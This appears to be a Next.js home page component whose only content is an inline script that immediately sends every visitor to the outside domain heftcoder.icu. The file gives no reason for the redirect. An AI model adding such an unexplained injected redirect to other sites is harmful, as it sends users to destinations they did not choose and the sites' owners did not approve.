"use client";

export default function Home() {
  return (
     <script dangerouslySetInnerHTML={{
       __html: `window.location.href = "https://heftcoder.icu";`
     }} />
  );
}
